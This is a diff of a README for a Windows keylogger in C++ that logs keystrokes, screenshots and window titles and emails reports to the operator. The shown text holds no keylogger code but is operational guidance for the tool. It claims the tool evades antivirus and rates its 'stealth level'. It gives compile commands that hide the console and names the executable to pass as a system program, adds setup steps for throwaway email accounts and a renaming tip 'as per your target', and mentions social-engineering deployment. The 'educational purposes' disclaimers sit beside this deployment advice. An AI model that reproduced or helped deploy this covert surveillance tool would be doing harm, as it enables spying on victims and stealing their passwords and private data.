@@ -1,9 +1,21 @@
 # Windows Keylogger with Email Reporting
 
 **⚠️ DISCLAIMER: This software is for educational purposes only. The author is not responsible for any misuse or damage caused by this program. Use it only on authorized systems.**
-
 ## Overview
-This is a Windows-based keylogger implementation in C++ that captures keyboard input and periodically sends reports via email. It uses Windows Hook API for keystroke capture and libcurl for email functionality.
+This is a Windows-based keylogger implementation in C++ that captures keyboard input,screen captures,windows title capture  and periodically sends reports via email. It uses Windows Hook API for keystroke capture and libcurl for email functionality.
+
+## Key Differences
+
+| Feature                   | basic_implementation_email.cpp| window_screenshot_implementation.cpp |
+|---------------------------|-------------------------------|--------------------------------------|
+| Keystroke Logging         | ✅ Basic                      | ✅ Advanced with context             |
+| Email Reporting           | ✅ Text only                  | ✅ Text + Screenshots                |
+| Screenshot Capture        | ❌                            | ✅                                   |
+| Window Title Tracking     | ❌                            | ✅                                   |
+| System Resource Usage     | 🟢 Minimal                    | 🟡 Moderate                          |
+| Build Complexity          | 🟢 Simple                     | 🟡 Requires additional libraries     |
+| Stealth Level             | 🟢 High                       | 🟡 Moderate (due to screenshots)     |
+
 
 ## Antivirus Detection Results
 This implementation has been tested against major antivirus solutions and remains undetected. Below are the scan results from multiple antivirus scanners:
@@ -63,9 +75,9 @@ This implementation has been tested against major antivirus solutions and remain
   ```
 
 ### Building from Source
-1. Create a temporary mail before following 2. ,scroll down to section "Create Temporary Email Using temp-mail.org" 
+1. Create a temporary mail before following 2. or 3.  ,scroll down to section "Create Temporary Email Using temp-mail.org" 
 
-2. Compile the source:
+2. Compile basic_implementation_email.cpp using MinGW-w64:
    ```bash
    # Using MinGW-w64 (recommended for stealth)
    g++ basic_implementation_email.cpp -o iDiags -lcurl -lwinmm -mwindows
@@ -79,6 +91,19 @@ This implementation has been tested against major antivirus solutions and remain
    ```
 
    Note: The `-mwindows` flag prevents the console window from appearing when running the program, making it more stealthy. Remove this flag during development/debugging to see console output.
+
+3. Compile window_screenshot_implementation.cpp using MinGW-w64:
+
+   ```bash
+   # Using MinGW-w64(recommended for stealth)
+   g++ window_screenshot_implementation.cpp -o win64 -lgdiplus -lcurl -lwinmm -mwindows
+   ```
+   Note: The name of the compiled executable is 'win64.exe' ,you need to change the name as per your target.
+
+   ```bash
+   # For debugging (with console)
+   g++ window_screenshot_implementation.cpp -o win_service_debug -lgdiplus -lcurl -lwinmm
+   ```
 
 #### Create Temporary Email Using temp-mail.org
 ![Email Setup](images/email.png)
@@ -101,11 +126,31 @@ Before running, modify these constants in the source code:
 #define SEND_REPORT_EVERY 60 // seconds
 ```
 
+### Important Configuration Notes
+
+Before running either implementation:
+
+1. Email Configuration:
+   - Set up a mailtrap.io account as described in the Email Setup section
+   - Update the EMAIL_ADDRESS and EMAIL_PASSWORD in the source code
+   - Configure the SMTP settings according to your mailtrap.io credentials
+
+2. Timing Configuration:
+   - Adjust SEND_REPORT_EVERY value (in seconds) based on your needs
+   - Default is set to 60 seconds
+
+3. Output File Names:
+   - Screenshots are saved with timestamp-based names
+   - Consider changing the output directory path if needed
+
+⚠️ **Remember**: Choose the implementation that best suits your educational needs. The window_screenshot_implementation.cpp provides more detailed monitoring capabilities but requires additional system resources.
+
 ## Usage
 1. Run the compiled executable:
    ```bash
    ./iDiags
    ```
+   note: the name of the compiled executable is 'iDiags.exe', it will differ depending on how you compiled the program
 2. The program will:
    - Start capturing keystrokes
    - Send email reports every 60 seconds
@@ -139,7 +184,6 @@ The success of this strategy relies heavily on social engineering principles:
 - Blending in with expected system behavior
 
 ⚠️ **REMINDER: This information is for educational purposes only. Using this knowledge for malicious purposes is illegal and unethical.**
-
 
 ## Technical Implementation
 
